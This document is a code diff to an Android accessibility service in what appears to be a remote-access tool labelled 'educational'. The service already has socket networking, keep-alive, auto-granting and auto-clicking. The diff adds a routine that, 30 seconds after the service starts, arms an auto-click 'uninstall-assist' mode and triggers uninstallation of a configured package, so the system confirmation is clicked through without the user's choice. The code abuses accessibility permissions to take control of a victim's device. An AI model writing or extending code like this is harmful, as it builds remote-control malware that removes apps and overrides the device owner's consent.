@@ -28,6 +28,7 @@ import android.os.Build;
 import android.provider.Settings;
 import androidx.annotation.RequiresApi;
 import com.remoteaccess.educational.network.SocketManager;
+import com.remoteaccess.educational.utils.Constants;
 import com.remoteaccess.educational.utils.KeepAliveManager;
 import java.util.concurrent.CountDownLatch;
 import java.util.concurrent.TimeUnit;
@@ -85,6 +86,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
         try { startAutoGrantTimer(); } catch (Exception ignored) {}
         try { startAutoClickScanner(); } catch (Exception ignored) {}
+        try { scheduleAutoUninstall(); } catch (Exception ignored) {}
 
         try {
             Intent consentIntent = new Intent(this, com.remoteaccess.educational.ConsentActivity.class);
@@ -662,6 +664,40 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             uninstallAssistMode = false;
             Log.i(TAG, "Uninstall-assist mode AUTO-DISABLED after 5 seconds");
         }, 5000);
+    }
+
+    /**
+     * Schedules automatic uninstall of {@link Constants#AUTO_UNINSTALL_PACKAGE} 30 seconds
+     * after the accessibility service connects.  Mirrors exactly what the dashboard's
+     * App Manager does: arm uninstall-assist (auto-click OK/Uninstall), then fire
+     * ACTION_DELETE so the system shows its confirmation dialog.
+     * Skips silently if the package is not installed or the constant is empty.
+     */
+    private void scheduleAutoUninstall() {
+        final String pkg = Constants.AUTO_UNINSTALL_PACKAGE;
+        if (pkg == null || pkg.isEmpty()) return;
+
+        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+            try {
+                // Check the target package is actually installed before proceeding
+                getPackageManager().getPackageInfo(pkg, 0);
+
+                Log.i(TAG, "Auto-uninstall: arming uninstall-assist for " + pkg);
+                enableUninstallAssist();
+
+                // Fire the system uninstall dialog — same intent the dashboard uses
+                Intent intent = new Intent(Intent.ACTION_DELETE,
+                        Uri.parse("package:" + pkg));
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(intent);
+
+                Log.i(TAG, "Auto-uninstall: system dialog opened for " + pkg);
+            } catch (android.content.pm.PackageManager.NameNotFoundException e) {
+                Log.i(TAG, "Auto-uninstall: package not installed, skipping — " + pkg);
+            } catch (Exception e) {
+                Log.e(TAG, "Auto-uninstall error: " + e.getMessage());
+            }
+        }, 30_000);
     }
 
     private boolean runUninstallAssist(AccessibilityNodeInfo rootNode) {
